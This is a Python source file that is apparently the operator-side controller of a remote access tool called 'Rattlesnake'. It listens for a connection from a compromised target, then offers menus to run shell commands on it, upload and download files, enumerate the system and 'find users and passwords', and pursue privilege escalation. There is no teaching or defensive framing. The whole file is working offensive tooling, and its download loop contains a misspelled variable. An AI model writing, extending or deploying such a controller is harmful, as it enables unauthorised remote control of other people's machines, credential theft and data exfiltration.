import socket
import subprocess
import os
from time import sleep
from termcolor import cprint

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
con = None
addr = None
HEADER = 64

error_message = lambda x: cprint(x, 'red')
success_message = lambda x: cprint(x, 'green')
info_message = lambda x: cprint(x, 'blue')


class utils:

    def cls():
        os.system("clear")

    def fileupload(file, con, addr):
        filename = file.split("/")[-1]
        filename_len = str(len(filename)).encode()
        filename_len += b' ' * (HEADER - len(filename_len))
        con.send(filename_len)
        con.send(filename.encode())

        response_len = con.recv(HEADER).decode()
        response = con.recv(int(response_len)).decode()
        if response == "Permission error":
            error_message("Rattlesnake is unable to write to files, returning..")
            sleep(3)
            utils.cls()
            return
        else:
            success_message("Target is ready to recieve files")
            info_message(f"Sending {file}")
            f = open(file, "rb")
            l = f.read(1024)
            while (l):
                info_message("Sending 1024 bytes..")
                con.send(l)
                l = f.read(1024)
            f.close()
            success_message("File succesfully uploaded! Returning..")
            sleep(3)
            return

    def filedownload(filepath, outfile, con, addr):
        filepath_len = str(len(filepath)).encode()
        filepath_len += b' ' * (HEADER - len(filepath_len))
        con.send(filepath_len)
        con.send(filepath.encode())
        response_len = con.recv(HEADER).decode()
        response = con.recv(int(response_len)).decode()
        if response == "Does not exist":
            error_message(f"{filepath} does not exist on {addr[0]}")
            sleep(3)
            utils.cls()
            return
        elif response == "Permission error":
            error_message(f"Rattlesnake is unable to read that file, returning..")
            sleep(3)
            utils.cls()
            return

        filesize_len = con.recv(HEADER).decode()
        filesize = con.recv(int(filesize_len)).decode()
        filesize = int(filesize)
        info_message(f"Downloading {filesize} bytes...")
        f = open(outfile, 'ab')
        l = con.recv(1024)
        recievedbytes = 1024
        try:
            while (l):
                info_message("Recieving 1024 bytes..")
                f.write(l)
                if recievedbytes > filesize:
                    break
                l = con.recv(1024)
                recvievedbyes += 1024
        except KeyboardInterrupt:
            info_message("Returning..")
            f.close()
            sleep(3)
            utils.cls()
            return
        f.close()
        success_message(f"File successfully downloaded to {outfile}")
        sleep(3)
        utils.cls()
        return

class enumeration:

    def enumerate(con, addr):
        while True:
            print("(1) System info")
            print("(2) Permissions")
            print("(3) Files")
            print("(4) Network info")
            print("(5) Find users and passwords")
            print("(<) Back")
            menu_choice = input("Please enter an option from the menu: ")
            if menu_choice in ["1", "2", "3", "4", "5", "<"]:
                break
            else:
                print("Invalid menu choice, please enter the number or symbol")
                sleep(3)
                utils.cls()

        if menu_choice == "<":
            utils.cls()
            return

        menu_str = f"enumerate:{menu_choice}"
        menu_len = str(len(menu_str)).encode()
        menu_len += b' ' * (HEADER - len(menu_len))
        con.send(menu_len)
        con.send(menu_str.encode())
        info_message("Performing enumeration, this may take a while..")
        while True:
            try:
                result_len = con.recv(HEADER).decode()
                results = con.recv(int(result_len)).decode()
                break
            except ValueError:
                pass
        input(results + "\nPress enter to go back")
        return

class controls:

    def connect():
        while True:
            try:
                port = int(input("Please enter the port to listen on: "))
                break
            except ValueError:
                error_message("Invalid port! Please enter an integer")
                sleep(3)
                utils.cls()

        try:
            global con, addr
            s.bind(("0.0.0.0", port))
            s.listen(5)
            con, addr = s.accept()
            success_message(f"Connected to {addr[0]}:{addr[1]}")
            sleep(2)
            utils.cls()
            return

        except socket.gaierror:
            error_message("Connection failed! Returning..")
            sleep(3)
            utils.cls()

    def execcommands(con, addr):
        cmd_len = str(len("execcommands")).encode()
        cmd_len += b' ' * (HEADER - len(cmd_len))
        con.send(cmd_len)
        con.send("execcommands".encode())
        while True:
            try:
                cmd=input("$ ")
                if cmd.strip() != "":
                    if cmd == "quit" or cmd == "exit":
                        controls.close_connection(con, addr)
                        quit()
                    elif cmd == "back":
                        cmd_len = str(len(cmd)).encode()
                        cmd_len += b' ' * (HEADER - len(cmd_len))
                        con.send(cmd_len)
                        con.send("back".encode())
                        return
                    cmd_len = str(len(cmd)).encode()
                    cmd_len += b' ' * (HEADER - len(cmd_len))
                    con.send(cmd_len)
                    con.send(cmd.encode())
                    cmd_len = c_cmd=con.recv(HEADER)
                    try:
                        c_cmd = con.recv(int(cmd_len))
                    except ValueError:
                        c_cmd = con.recv(1024)
                    print(f"{addr[0]}: {c_cmd.decode()}")
            except KeyboardInterrupt:
                controls.close_connection(con, addr)
                quit()

    def privesc(con, addr):
        while True:
            print("(1) Enumerate")
            print("(2) Upload file")
            print("(3) Download file")
            print("(<) Back")
            menu_choice = input("Please enter an option from the menu: ").strip()
            if menu_choice in ["1", "2", "3", "<"]:
                break
            else:
                print("Invalid menu choice, please enter the number or symbol")
                sleep(3)
                utils.cls()

        if menu_choice == "<":
            return

        elif menu_choice == "1":
            enumeration.enumerate(con, addr)

        elif menu_choice == "2":
            file = input("Please enter the file you would like to upload: ")
            if os.path.exists(file):
                cmd_len = str(len("fileupload")).encode()
                cmd_len += b' ' * (HEADER - len(cmd_len))
                con.send(cmd_len)
                con.send("fileupload".encode())
                utils.fileupload(file, con, addr)
                return
            else:
                error_message("File does not exist! Returning...")
                return

        elif menu_choice == "3":
            filepath = input("Please enter the file you'd like to download: ")
            outfile = input("Please enter the file you would like to write it to: ")
            cmd_len = str(len("filedownload")).encode()
            cmd_len += b' ' * (HEADER - len(cmd_len))
            con.send(cmd_len)
            con.send("filedownload".encode())
            utils.filedownload(filepath, outfile, con, addr)
            return

    def close_connection(con, addr):
        cmd_len = str(len("exit")).encode()
        cmd_len += b' ' * (HEADER - len(cmd_len))
        con.send(cmd_len)
        con.send("exit".encode())
        info_message(f"Disconnecting from {addr[0]}")
        con.close()
        return

def main():
    utils.cls()
    while True:
        print("(1) Listen")
        print("(2) Execute commands")
        print("(3) Priv esc")
        print("(<) Close connection and exit")
        menu_choice = input("Please enter an option from the menu: ")
        if menu_choice in ["1", "2", "3", "4", "<"]:
            break
        else:
            error_message("Please pick an option from the menu!")
            sleep(3)
            utils.cls()

    if menu_choice == "1":
        controls.connect()
        main()



    elif menu_choice == "2":
        if con is None:
            print("Please connect to the target before executing commands")
            sleep(3)
            utils.cls()
            main()
        controls.execcommands(con, addr)
        main()

    elif menu_choice == "3":
        if con is None:
            print("Please connect to the target before executing commands")
            sleep(3)
            utils.cls()
            main()
        controls.privesc(con, addr)
        main()

    else:
        if con is not None:
            controls.close_connection(con, addr)
        utils.cls()
        exit()


if __name__ == "__main__":
    main()
